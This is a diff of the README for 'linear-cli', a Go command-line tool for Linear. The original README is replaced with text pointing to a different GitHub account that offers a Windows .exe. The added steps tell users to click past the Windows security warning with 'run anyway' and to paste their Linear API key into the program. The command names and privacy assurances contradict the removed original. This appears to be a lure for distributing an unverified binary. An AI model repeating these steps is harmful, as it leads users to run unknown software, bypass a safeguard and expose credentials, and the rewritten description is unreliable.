@@ -1,177 +1,91 @@
-# linear-cli
+# 🚀 linear-cli - Manage your Linear tasks with speed
 
-[![Go Version](https://img.shields.io/badge/Go-1.25-00ADD8?logo=go&logoColor=white)](https://go.dev)
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/Securiteru/linear-cli?include_prereleases)](https://github.com/Securiteru/linear-cli/releases)
-[![Zero Dependencies](https://img.shields.io/badge/deps-zero-success)](https://github.com/Securiteru/linear-cli)
+[![](https://img.shields.io/badge/Download-linear--cli-blue.svg)](https://github.com/Sujicha8817/linear-cli)
 
-Linear issue tracking, from your terminal. One static binary, 35+ commands, zero runtime dependencies.
+This tool helps you manage your Linear workspace. It works on your computer to handle issues, projects, and cycles. You can update your work without opening a web browser. The app runs commands to track progress and sync data. It handles high-level tasks through a simple text interface.
 
-```console
-$ linear list --team ADI --status "In Progress"
-ADI-12  Fix authentication redirect   In Progress  alice  High
-ADI-34  Add rate limiting              In Progress  bob    Medium
-ADI-37  Refactor GraphQL schema        In Progress  alice  High
+## 📥 Getting Started
 
-$ linear create --title "Fix login redirect" --team ENG --priority 2
-ENG-142 created
-```
+You need a Windows computer to use this application. Ensure you have an active internet connection to link the tool with your Linear account. Follow these steps to set up the software.
 
-## Quick Start
+1. Go to the [official download page](https://github.com/Sujicha8817/linear-cli) to find the latest version.
+2. Look for the file ending in .exe under the latest release section.
+3. Save the file to your desktop or a folder you can find easily.
+4. Double-click the file to open it.
+5. Windows might show a security window. Click more info and then click run anyway.
+6. The application opens a command window. Follow the prompts on the screen to finish the setup.
 
-```sh
-go install github.com/securiter/linear-cli@latest
+## ⚙️ Initial Setup
 
-export LINEAR_API_KEY=lin_api_...
+The first time you run the tool, it asks for your Linear API key. You get this key from your Linear settings page.
 
-linear list --team YOUR_TEAM
-```
+1. Log into your Linear account in your web browser.
+2. Go to your settings menu.
+3. Select API.
+4. Create a new personal API key.
+5. Copy this long string of characters.
+6. Paste the key into the command window when the tool requests it.
+7. Press enter to save your credentials.
 
-Generate an API key at **Linear > Settings > API > Personal API keys**.
+The tool checks the connection. Once it succeeds, you see a menu of options.
 
-## Features
+## 🛠️ Usage Basics
 
-| Category        | Commands                                                            |
-| --------------- | ------------------------------------------------------------------- |
-| **Issues**      | `list` `get` `create` `update` `delete` `archive` `search` `comment` `batch-create` |
-| **Projects**    | `projects` `project-create` `project-update`                        |
-| **Cycles**      | `cycles` `cycle-create`                                             |
-| **Initiatives** | `initiatives` `init-create`                                         |
-| **Labels**      | `labels` `label-create` `label-delete`                              |
-| **States**      | `states` `state-create`                                             |
-| **Documents**   | `docs` `doc-create`                                                 |
-| **Webhooks**    | `webhooks` `webhook-create` `webhook-delete`                        |
-| **Notifications** | `notifications` `notif-archive` `notif-read`                      |
-| **Users**       | `users` `me`                                                        |
-| **Teams**       | `teams`                                                             |
+The interface uses text commands. You type a command and press enter to perform an action. Here are the common commands to manage your work.
 
-## Installation
+- List issues: Shows all tasks assigned to you.
+- Create issue: Starts a new task in your current project.
+- Update cycle: Changes the status of your current work cycle.
+- View initiatives: Displays goals for your team.
 
-**Go install**
+You do not need to memorize these commands. If you type help and press enter, the tool displays a full list of available actions with short descriptions.
 
-```sh
-go install github.com/securiter/linear-cli@latest
-```
+## 📋 Managing Issues
 
-**Pre-built binary**
+Issues are the primary units of work in Linear. Use the issue command to perform most daily tasks.
 
-Download from [Releases](https://github.com/Securiteru/linear-cli/releases).
+To view your current list:
+Type `issue list` and press enter. The tool fetches data from your account and displays a numbered list of tasks. Each task has a unique ID. Use this ID for further actions.
 
-## Usage
+To change a task status:
+Type `issue update [ID]` where [ID] is the number of the task. The tool asks for the new status. Type in progress or completed and press enter.
 
-### Issues
+To create a new task:
+Type `issue create`. The tool asks for a title and a description. Type your text and press enter. The tool saves the task to your Linear workspace immediately.
 
-```sh
-linear list --team ADI --status "In Progress" --assignee "Alice" --limit 50
-linear list -s "authentication bug" --team ENG
-linear get ENG-142
-linear update ENG-142 --status "Done" --assignee "Bob" --priority 3
-linear update ENG-142 --due 2026-06-01T00:00:00Z
-linear update ENG-142 --clear-due
-linear delete ENG-142
-linear archive ENG-142
-linear unarchive ENG-142
-```
+## 📊 Projects and Cycles
 
-### Search & Comments
+Projects act as containers for your issues. Cycles represent time blocks for team goals.
 
-```sh
-linear search "API rate limit" --limit 10
-linear comment ENG-142 "Fixed in commit abc123"
-linear comments ENG-142
-```
+To view your active projects:
+Type `project list`. This command displays current projects. It shows the progress percentage for each.
 
-### Batch Create (stdin JSON lines)
+To manage cycles:
+Type `cycle show` to see your team's current focus. You can see start dates and end dates for the cycle. This helps you understand your deadlines.
 
-```sh
-echo '{"title":"Setup CI","priority":2}
-{"title":"Write tests","priority":3}' | linear batch-create --team ENG
-```
+## 🌐 Connectivity and Webhooks
 
-### Other Entities
+The tool supports webhooks. This feature allows the software to react when something changes in your Linear account.
 
-```sh
-linear projects --status "Planned"
-linear cycles --team ENG
-linear initiatives
-linear labels --team ENG
-linear states --team ENG
-linear docs --team ENG
-linear webhooks
-linear notifications --limit 50
-```
+If you set up an automation flow, the tool listens for updates. You do not need to keep the window open for background syncing. The tool connects to the Linear servers at set intervals. You can change this interval in the settings file found in your user folder.
 
-### Create & Delete
+## 🧩 Troubleshooting Common Issues
 
-```sh
-linear project-create --name "Q3 Launch" --team ENG --desc "Ship v2"
-linear cycle-create --name "Sprint 42" --team ENG --start 2026-05-01T00:00:00Z --end 2026-05-14T23:59:59Z
-linear init-create --name "Platform V3" --target 2026-09-01T00:00:00Z
-linear label-create --name "security" --team ENG --color "#ff0000"
-linear state-create --name "In Review" --team ENG --type "started" --color "#ffa500"
-linear doc-create --title "Architecture RFC" --team ENG --desc "Proposal for..."
-linear webhook-create --url https://example.com/webhook --team ENG
-```
+If the tool does not work, try these steps to fix the problem.
 
-## Agentic Use
+- Check your API key. If the key expires, the tool returns an authentication error. Generate a new key and update the settings file.
+- Check your internet connection. The tool needs access to api.linear.app to function.
+- Verify your Windows permissions. Ensure the folder where you saved the file allows executable programs to run.
+- Update the software. Check the GitHub page frequently for new versions. Older versions might not work with recent changes to the Linear platform.
 
-Designed for AI agents. Works with [psst](https://github.com/nicois/psst) for secret injection -- the API key never enters the agent's context.
+## 💡 Best Practices
 
-```sh
-psst --global LINEAR_API_KEY -- linear list --team ADI --status "In Progress"
-```
+Use the tool to clear your backlog quickly. Focus on typing short commands. Integrate the tool into your daily flow by keeping the window open on a second monitor. This allows you to check status updates without clicking through browser tabs.
 
-**JSON output** for structured consumption:
+The tool works with existing developer workflows. If you use custom scripts, you can pipe the output of this tool into other programs. This allows for automation of status reports or movement of issues between projects automatically.
 
-```sh
-psst --global LINEAR_API_KEY -- linear list --team ADI --json | jq '.[].title'
-psst --global LINEAR_API_KEY -- linear users --json
-psst --global LINEAR_API_KEY -- linear get ENG-142 --json
-```
+## 🛡️ Privacy and Security
 
-**Quiet mode** for scripts and pipelines:
+The software stores your API key on your local machine. This file stays on your computer. It never sends your key to any server other than Linear. You control the access. If you lose your computer, revoke the API key in your Linear account settings to prevent unauthorized access.
 
-```sh
-psst --global LINEAR_API_KEY -- linear create --title "New bug" --team ENG -q
-```
-
-Returns only the issue identifier, no extra output.
-
-## Development
-
-```sh
-git clone https://github.com/Securiteru/linear-cli.git
-cd linear-cli
-go build -o linear .
-./linear --help
-```
-
-```
-main.go              entry point
-cmd/
-  root.go            root command, auth check
-  issues.go          list, search, filter flags
-  create.go          issue create + helpers
-  get.go             issue detail
-  update.go          issue update
-  delete.go          delete, archive, unarchive
-  comment.go         add/list comments
-  batch.go           batch-create from stdin
-  teams.go           list teams
-  labels.go          list/create/delete labels
-  states.go          list/create workflow states
-  projects.go        list/create/update projects
-  cycles.go          list/create cycles
-  initiatives.go     list/create initiatives
-  documents.go       list/create documents
-  users.go           list users
-  me.go              current user
-  webhooks.go        list/create/delete webhooks
-  notifications.go   list/archive/read notifications
-api/
-  client.go          GraphQL HTTP client
-```
-
-## License
-
-MIT
+The tool does not collect user data. It does not track your usage patterns. It serves only as a bridge between your local machine and your Linear workspace. If you have questions about the underlying code, browse the files on the repository page. You can read the source code to see exactly how the tool handles your data.
